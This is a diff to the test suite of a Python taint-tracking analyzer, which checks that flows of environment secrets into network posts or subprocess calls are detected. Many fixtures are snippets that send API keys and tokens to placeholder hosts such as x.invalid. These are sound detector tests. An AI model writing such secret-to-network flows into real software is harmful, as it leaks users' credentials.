@@ -1508,7 +1508,6 @@ class TestDirectCalls:
             "upload(**{'payload': secret})",
             'upload(os.getenv("API_KEY"))',
             "wrapper(secret)",
-            "wrapper(payload=secret)",
         ):
             code = _code(
                 f"""
@@ -1523,6 +1522,10 @@ class TestDirectCalls:
                 """
             )
             assert len(_flows(code)) == 1, call
+        # A forwarded ``**kwargs`` binds only into the callee's own ``**``
+        # parameter, which ``upload`` lacks: the keyword is not followed.
+        forwarded = code.replace("wrapper(secret)", "wrapper(payload=secret)")
+        assert _run(forwarded) == []
 
     def test_defaults_varargs_and_kwargs(self) -> None:
         for definition, call in (
@@ -1541,6 +1544,25 @@ class TestDirectCalls:
                 """
             )
             assert len(_flows(code)) == 1, definition
+
+    def test_immediately_called_lambda_defaults_hold_their_value(self) -> None:
+        """A default ``(lambda: ...)()`` holds the lambda's return value, so its
+        body is read; a default that is a lambda holds a function and is not."""
+        for definition in (
+            'def f(tok=(lambda: os.getenv("API_TOKEN"))()):',
+            'def f(*, tok=(lambda: os.getenv("API_TOKEN"))()):',
+            'def f(tok=(lambda k: os.getenv(k))("API_TOKEN")):',
+            'f = lambda tok=(lambda: os.getenv("API_TOKEN"))(): requests.post(URL, data=tok)',
+        ):
+            body = "" if definition.startswith("f = ") else "    requests.post(URL, data=tok)\n"
+            code = f'import os, requests\nURL = "https://x.invalid"\n{definition}\n{body}'
+            assert [f.rule_id for f in _run(code)] == ["TT3"], definition
+        not_called = (
+            "import os, requests\n"
+            'def f(tok=lambda: os.getenv("API_TOKEN")):\n'
+            '    requests.post("https://x.invalid", data=tok)\n'
+        )
+        assert _run(not_called) == []
 
     def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
         cap = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS
@@ -1563,6 +1585,25 @@ class TestDirectCalls:
         # Arguments past the cap never reach the explicit parameters before it.
         assert _flows(module(cap + 1, cap, 0)) == []
         assert _flows(module(cap + 1, cap, cap - 1)) == []
+        # The argument at exactly index ``cap`` also reaches ``*rest``, as a
+        # function argument and after an implicit ``self`` (offset 1).
+        leading = ", ".join(["0"] * cap)
+        star = (
+            "import os, requests\n"
+            "def send(*rest):\n"
+            '    requests.post("https://example.invalid", data=rest)\n'
+            f'send({leading}, os.getenv("API_KEY"))\n'
+        )
+        method = (
+            "import os, requests\n"
+            "class Api:\n"
+            f"    def send(self, {', '.join(f'p{i}' for i in range(cap - 1))}, *rest):\n"
+            '        requests.post("https://example.invalid", data=rest)\n'
+            "    def run(self):\n"
+            f'        self.send({", ".join(["0"] * (cap - 1))}, os.getenv("API_KEY"))\n'
+        )
+        assert len(_flows(star)) == 1
+        assert len(_flows(method)) == 1
 
     def test_unpacked_arguments_bind_by_position_and_name(self) -> None:
         """``*seq`` fills parameters from its position on; ``**mapping`` fills
@@ -2333,7 +2374,7 @@ class TestMethods:
             """
         )
         assert _summary(unbound) == [("TT5", _line(unbound, "# SINK"))]
-        # Forwarding still reaches the base's named parameter.
+        # Positional forwarding still reaches the base's named parameter.
         true_flow = _code(
             """
             import os, requests
@@ -2343,14 +2384,15 @@ class TestMethods:
             class Child(Base):
                 def __init__(self, *args, **kwargs):
                     super().__init__(*args, **kwargs)
-            Child(token=os.getenv("API_TOKEN"))
+            Child(os.getenv("API_TOKEN"))
             """
         )
         assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]
 
-    def test_forwarded_kwargs_bind_only_the_keywords_passed_in(self) -> None:
-        """``super().__init__(**kwargs)`` forwards the keyword names the
-        subclass's callers pass, not a wildcard over every parameter."""
+    def test_forwarded_kwargs_bind_only_the_callees_kwargs(self) -> None:
+        """A forwarded ``**kwargs`` is one value whose names are not tracked:
+        it binds only into the callee's own ``**`` parameter, never into
+        named or keyword-only parameters (``main`` binds nothing at all)."""
         base = _code(
             """
             import os, requests
@@ -2361,40 +2403,41 @@ class TestMethods:
                 def health(self):
                     return requests.get("https://api.invalid/health", timeout=self.timeout)
                 def send(self):
-                    return requests.post("https://api.invalid", headers={"K": self.api_key})  # SINK
+                    return requests.post("https://api.invalid", headers={"K": self.api_key})
             class OpenAIClient(BaseClient):
                 def __init__(self, **kwargs):
                     super().__init__(**kwargs)
             """
         )
-        named = base + 'OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"))\n'
-        assert _summary(named) == [("TT3", _line(named, "# SINK"))]
-        # An opaque mapping at the call site may hold any name: every keyword
-        # parameter except the implicit receiver can receive it.
-        opaque = base + 'OpenAIClient(**{"api_key": os.getenv("OPENAI_API_KEY")})\n'
-        assert len(_flows(opaque)) == 2
-        reassigned = named.replace(
-            "        super().__init__(**kwargs)",
-            "        kwargs = dict(kwargs)\n        super().__init__(**kwargs)",
-        )
-        assert len(_flows(reassigned)) == 2
-        # A keyword the subclass takes by name never reaches its ``**kwargs``,
-        # so forwarding it binds only the names that do.
-        own_parameter = _code(
+        for call in (
+            'OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"))',
+            'OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"), timeout=10).health()',
+            'OpenAIClient(**{"api_key": os.getenv("OPENAI_API_KEY")})',
+        ):
+            assert _run(base + call + "\n") == [], call
+        wrapper = _code(
             """
             import os, requests
-            class BaseClient:
-                def __init__(self, api_key=None, timeout=30, **rest):
-                    self.api_key = api_key
-                def send(self):
-                    return requests.post("https://api.invalid", headers={"K": self.api_key})
-            class OpenAIClient(BaseClient):
-                def __init__(self, api_key=None, **kwargs):
-                    super().__init__(**kwargs)
-            OpenAIClient(api_key="public", extra=os.getenv("OPENAI_API_KEY"))
+            def fetch(url=None, token=None):
+                return requests.get(url, timeout=5)
+            def wrapper(**kw):
+                return fetch(**kw)
+            wrapper(url="https://status.invalid", token=os.getenv("API_TOKEN"))
             """
         )
-        assert _run(own_parameter) == []
+        assert _run(wrapper) == []
+        # Into a callee that takes ``**kwargs`` itself, the value does flow.
+        into_kwargs = _code(
+            """
+            import os, requests
+            def send(**opts):
+                requests.post("https://x.invalid", json=opts)  # SINK
+            def wrapper(**kw):
+                return send(**kw)
+            wrapper(token=os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(into_kwargs) == [("TT3", _line(into_kwargs, "# SINK"))]
 
     def test_overflow_arguments_never_fill_earlier_parameters(self) -> None:
         cap = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS
@@ -2486,6 +2529,107 @@ class TestMethods:
         assert [f.rule_id for f in _run(chain(depth - 1))] == ["TT3"]
         assert _run(chain(depth)) == []
 
+    def test_lookup_bound_holds_with_several_bases(self) -> None:
+        """The cap counts classes in C3 order also when the merge has several
+        bases: the 8th class is searched, the 9th is not."""
+
+        def module(owner: int) -> str:
+            lines = ["import os, requests"]
+            for i in range(8):
+                if i == owner:
+                    lines += [
+                        f"class A{i}:",
+                        "    def send(self, payload):",
+                        '        requests.post("https://x.invalid", data=payload)',
+                    ]
+                else:
+                    lines.append(f"class A{i}: pass")
+            lines += [
+                "class D(" + ", ".join(f"A{i}" for i in range(8)) + "):",
+                "    def go(self):",
+                '        self.send(os.getenv("API_KEY"))',
+            ]
+            return "\n".join(lines) + "\n"
+
+        assert behavioral_taint_tracking._MAX_ANCESTORS == 8
+        assert [f.rule_id for f in _run(module(6))] == ["TT3"]  # D, A0..A6: 8th
+        assert _run(module(7)) == []  # A7 is the 9th class in the order
+
+    def test_c3_keeps_local_precedence_and_every_base(self) -> None:
+        """``class C(B1, B2, B3)`` with ``B1(B3)`` resolves ``B2`` before
+        ``B3``, and a base past the 8th still constrains the order."""
+        local = _code(
+            """
+            import os, requests, subprocess
+            class B3:
+                def handle(self, value):
+                    subprocess.run(value)
+            class B1(B3):
+                pass
+            class B2:
+                def handle(self, value):
+                    requests.post("https://x.invalid", data=value)  # SINK
+            class C(B1, B2, B3):
+                def go(self):
+                    self.handle(os.getenv("API_KEY"))
+            """
+        )
+        assert _summary(local) == [("TT3", _line(local, "# SINK"))]
+        nine = (
+            "import os, requests, subprocess\n"
+            "class X:\n    def handle(self, value):\n        subprocess.run(value)\n"
+            "class A0(X): pass\n"
+            "class A1:\n    def handle(self, value):\n"
+            '        requests.post("https://x.invalid", data=value)  # SINK\n'
+            + "".join(f"class A{i}: pass\n" for i in range(2, 8))
+            + "class A8(X): pass\n"
+            "class D(" + ", ".join(f"A{i}" for i in range(9)) + "):\n"
+            '    def go(self):\n        self.handle(os.getenv("API_KEY"))\n'
+        )
+        assert _summary(nine) == [("TT3", _line(nine, "# SINK"))]
+
+    def test_self_and_plain_cls_calls_are_not_constructors(self) -> None:
+        """Only a classmethod's ``cls(...)`` constructs; ``self()`` and the
+        first parameter of an undecorated method (a metaclass's ``cls``) do
+        not."""
+        for code in (
+            _code(
+                """
+                import os, requests
+                class Vault:
+                    def load(self):
+                        return os.environ.get("TOKEN")
+                    def push(self):
+                        v = self().load()
+                        requests.post("https://x.invalid", data=v)
+                """
+            ),
+            _code(
+                """
+                import os, requests
+                class Meta(type):
+                    def secret(cls):
+                        return os.environ.get("TOKEN")
+                    def make(cls):
+                        v = cls().secret()
+                        requests.post("https://x.invalid", data=v)
+                """
+            ),
+            _code(
+                """
+                import os, requests
+                class Client:
+                    def __init__(self, token=None):
+                        requests.post("https://x.invalid", data=token)
+                    def __call__(self, token):
+                        return token
+                    def rebuild(self):
+                        self(os.environ.get("TOKEN"))
+                """
+            ),
+        ):
+            assert _run(code) == [], code
+
     def test_a_subclass_body_shadows_a_base_class_attribute(self) -> None:
         shadowed = _code(
             """
@@ -2517,6 +2661,39 @@ class TestMethods:
         )
         (finding,) = _run(own)
         assert f"'self.token' from os.environ.get (line {_line(own, '# OWN')}," in finding.message
+        # Any class-body binding shadows, also without a modelled value; an
+        # annotation without a value binds nothing and does not.
+        for binding in (
+            'api_key: str = "public"',
+            "api_key: Optional[str] = None",
+            'api_key: ClassVar[str] = ""',
+            "from json import dumps as api_key",
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                from typing import ClassVar, Optional
+                class Base:
+                    api_key = os.environ["KEY"]
+                class Public(Base):
+                    {binding}
+                    def send(self):
+                        requests.post("https://x.invalid", headers={{"k": self.api_key}})
+                """
+            )
+            assert _run(code) == [], binding
+        annotation_only = _code(
+            """
+            import os, requests
+            class Base:
+                api_key = os.environ["KEY"]
+            class Public(Base):
+                api_key: str
+                def send(self):
+                    requests.post("https://x.invalid", headers={"k": self.api_key})
+            """
+        )
+        assert [f.rule_id for f in _run(annotation_only)] == ["TT3"]
         # An instance store in the subclass does not hide the class value
         # (flow-insensitive, as documented).
         instance = _code(
@@ -2905,6 +3082,21 @@ class TestScopes:
             """
         )
         assert _run(store_only) == []
+        # Reading the name in the class body does not give the class's own
+        # value (and so ``self.TOKEN``) the global's taint.
+        for read in ("print(TOKEN)", 'HEADERS = {"X-Token": TOKEN}'):
+            code = _code(
+                f"""
+                import os, requests
+                TOKEN = os.environ.get("TOKEN")
+                class PublicClient:
+                    TOKEN = "public-demo-token"
+                    {read}
+                    def ping(self):
+                        return requests.get("https://x.invalid", headers={{"X": self.TOKEN}})
+                """
+            )
+            assert _run(code) == [], read
         # The global reaches the class-body name in main's order, so the
         # message names the global's source as main does.
         ordered = _code(
@@ -3173,11 +3365,14 @@ class TestSourceRank:
 
 
 class TestMessageCompatibility:
-    """Messages keep main's wording for every flow main also reports.
+    """Messages keep main's wording for every flow main also reports with the
+    same rule, except where main's fact came from a same-named variable in
+    another scope, where a raised rule at the sink subsumes or re-cites a
+    weaker finding, and where an identifier exceeds ``_MAX_NAME_CHARS``.
 
-    Exact baseline fingerprints and message-glob baseline rules include the
-    message: the variable read at the sink and the line of the statement that
-    last tainted it (not the line of the original source call).
+    Message-glob baseline rules match the message: the variable read at the
+    sink and the line of the statement that last tainted it (not the line of
+    the original source call).
     """
 
     def test_reassignment_chain_cites_the_last_assignment(self) -> None:
@@ -3340,6 +3535,84 @@ class TestMessageCompatibility:
         ``main`` does, so exact baselines and message globs keep matching."""
         (finding,) = _run(code)
         assert finding.message == message
+
+    @pytest.mark.parametrize(
+        ("code", "messages"),
+        [
+            pytest.param(
+                "import json, os, requests\n"
+                'config = json.load(open(os.getenv("APP_CONFIG", "config.json")))\n'
+                'requests.post(config["webhook_url"], json={"status": "ok"})\n',
+                [
+                    "TT4 Tainted flow: 'config' from open (line 2, file read) "
+                    "→ requests.post (network output)"
+                ],
+                id="config_path_from_env",
+            ),
+            pytest.param(
+                "import os, requests\n"
+                'path = os.getenv("APP_CONFIG")\n'
+                "data = open(path).read()\n"
+                'requests.post("https://x.invalid", data=data)\n',
+                [
+                    "TT4 Tainted flow: 'data' from open (line 3, file read) "
+                    "→ requests.post (network output)"
+                ],
+                id="path_variable_from_env",
+            ),
+            pytest.param(
+                "import os, requests\n"
+                'token = os.getenv("TOKEN")\n'
+                'meta = requests.get("https://x.invalid/a", headers={"A": token}).json()\n'
+                'requests.get(meta["url"])\n',
+                [
+                    "TT2 Tainted flow: 'meta' from requests.get (line 3, network input) "
+                    "→ requests.get (network output)",
+                    "TT3 Tainted flow: 'token' from os.getenv (line 2, credential/environment) "
+                    "→ requests.get (network output)",
+                ],
+                id="authenticated_get",
+            ),
+        ],
+    )
+    def test_a_source_calls_value_is_what_it_reads(self, code: str, messages: list[str]) -> None:
+        """A source call's arguments do not flow into its value: a file opened
+        at an environment path holds file contents, as ``main`` reports."""
+        assert sorted(f"{f.rule_id} {f.message}" for f in _run(code)) == messages
+
+    def test_main_tainted_variables_are_cited_before_bound_parameters(self) -> None:
+        """A parameter bound from a call site and read earlier at the sink
+        does not take over ``main``'s message for the same rule."""
+        for code, message in (
+            (
+                _code(
+                    """
+                    import os, requests
+                    def send(url):
+                        token = os.getenv("TOKEN")
+                        requests.post(url, data=token)
+                    send(os.getenv("BASE_URL"))
+                    """
+                ),
+                "Tainted flow: 'token' from os.getenv (line 3, credential/environment) "
+                "→ requests.post (network output)",
+            ),
+            (
+                _code(
+                    """
+                    import os, subprocess
+                    def run(binary, *args):
+                        extra = os.getenv("EXTRA_FLAGS")
+                        subprocess.run([binary, extra, *args])
+                    run(os.getenv("TOOL"))
+                    """
+                ),
+                "Tainted flow: 'extra' from os.getenv (line 3, credential/environment) "
+                "→ subprocess.run (code execution)",
+            ),
+        ):
+            (finding,) = _run(code)
+            assert finding.message == message
 
     def test_a_rule_upgrade_cites_the_first_of_the_most_severe_sources(self) -> None:
         code = (
@@ -3661,12 +3934,28 @@ def _chained_lambda(n: int) -> str:
     return f"q = {{}}\n{names} = lambda {params}: 0\n" + "".join(f"a{i}(**q)\n" for i in range(n))
 
 
-def _nested_lambda_defaults(n: int) -> str:
-    """Lambdas nested n deep through their defaults."""
+def _nested_lambda_defaults(n: int, wrap: str = "{}") -> str:
+    """Lambdas nested n deep through their defaults (inside *wrap* each level)."""
     expression = "0"
     for _ in range(n):
-        expression = f"lambda a={expression}: 0"
-    return "".join(f"x{i} = {expression}\n" for i in range(4))
+        expression = f"lambda a={wrap.format(expression)}: 0"
+    return "y = g = print\n" + "".join(f"x{i} = {expression}\n" for i in range(4))
+
+
+def _nested_lambda_defaults_in_calls(n: int) -> str:
+    return _nested_lambda_defaults(n, "print({})")
+
+
+def _nested_lambda_defaults_in_conditionals(n: int) -> str:
+    return _nested_lambda_defaults(n, "y if y else {}")
+
+
+def _many_bases(n: int) -> str:
+    """One class listing n in-file bases, its methods called through self."""
+    bases = "".join(f"class B{i}:\n def m{i}(self, a):\n  return a\n" for i in range(n))
+    names = ", ".join(f"B{i}" for i in range(n))
+    calls = "".join(f"  self.m{i}(1)\n" for i in range(n))
+    return bases + f"class D({names}):\n def go(self):\n{calls}"
 
 
 def _forwarded_unpacking(n: int) -> str:
@@ -3680,8 +3969,8 @@ def _forwarded_unpacking(n: int) -> str:
 
 
 def _forwarded_keywords(n: int) -> str:
-    """Forwarded ``**kwargs`` whose callers pass many names: past the cap the
-    forwarding binds as one wildcard, not once per name."""
+    """Forwarded ``**kwargs`` whose callers pass many names: each forwarding
+    binds one slot per callee, however many names its callers pass."""
     params = ",".join(f"p{i}=0" for i in range(n))
     return (
         f"class B:\n def __init__(self, {params}):\n  pass\n"
@@ -3691,7 +3980,7 @@ def _forwarded_keywords(n: int) -> str:
     )
 
 
-# Every denial-of-service repro from the two reviews of this change, scaled
+# Every denial-of-service repro from the reviews of this change, scaled
 # down. Each must cost work linear in its size, so quadrupling the size may
 # at most about quadruple the analyzer's executed lines (a quadratic path
 # grows 16x).
@@ -3724,6 +4013,9 @@ _DOS_SHAPES = {
     "deep_scopes": (_deep_scopes, 20),
     "chained_lambda": (_chained_lambda, 150),
     "nested_lambda_defaults": (_nested_lambda_defaults, 40),
+    "nested_lambda_defaults_in_calls": (_nested_lambda_defaults_in_calls, 40),
+    "nested_lambda_defaults_in_conditionals": (_nested_lambda_defaults_in_conditionals, 40),
+    "many_bases": (_many_bases, 100),
     "forwarded_unpacking": (_forwarded_unpacking, 100),
     "forwarded_keywords": (_forwarded_keywords, 100),
 }
@@ -3739,6 +4031,29 @@ class TestResourceScaling:
         small = _operations(generate(size))
         large = _operations(generate(4 * size))
         assert large <= 5 * small, (shape, small, large)
+
+    def test_forwarded_kwargs_cost_one_slot_per_callee(self) -> None:
+        """A forwarded ``**k`` into a callee with many definitions and
+        parameters costs what an opaque mapping does, not one target per
+        keyword name its callers pass (the earlier fan-out was ~16x)."""
+        names = [f"b{i}" for i in range(16)]
+        params = ",".join(f"{name}=0" for name in names)
+        callee = (
+            "class f:\n"
+            f" def __init__(self,{params}):pass\n def __init__(self,**w):pass\n"
+            f" @classmethod\n def __init__(c,{params}):pass\n"
+            f" @staticmethod\n def __init__({params}):pass\n"
+            f" def __new__(c,{params}):pass\n"
+            f"def f({params}):pass\ndef f(**w):pass\n"
+        )
+        passed = ",".join(
+            f"{name}=os.environ['T']" if name == "b0" else f"{name}=1" for name in names
+        )
+        forwarded = "import os\n" + callee + "def g(**k):\n f(" + "**k," * 300 + ")\n"
+        forwarded += f"g({passed})\n"
+        opened = forwarded + "m = {}\ng(**m)\n"
+        assert _operations(forwarded) <= 2 * _operations(opened)
+        assert _operations(forwarded) <= 2 * _operations(forwarded.replace("**k,", "**m,"))
 
 
 class TestAdversarialInputs:
@@ -4084,6 +4399,25 @@ class TestAdversarialInputs:
                 "".join(f"def f{i}(a=0):\n    pass\n" for i in range(3000)),
                 1000,
                 id="build_functions",
+            ),
+            pytest.param(
+                # One key read by 30,720 flows into one target: few pops.
+                "drain",
+                "import os\nx = os.getenv('K')\n" + "t = x\n" * (30 * 1024),
+                20,
+                id="drain_flows_of_one_key",
+            ),
+            pytest.param(
+                "bind_arguments",
+                "def f(*a):\n    pass\nf(" + "x, " * 3000 + ")\n",
+                1000,
+                id="bind_positional_arguments",
+            ),
+            pytest.param(
+                "bind_arguments",
+                "def f(**k):\n    pass\nf(" + "".join(f"k{i}=x, " for i in range(3000)) + ")\n",
+                1000,
+                id="bind_keywords",
             ),
             pytest.param(
                 "propagate",
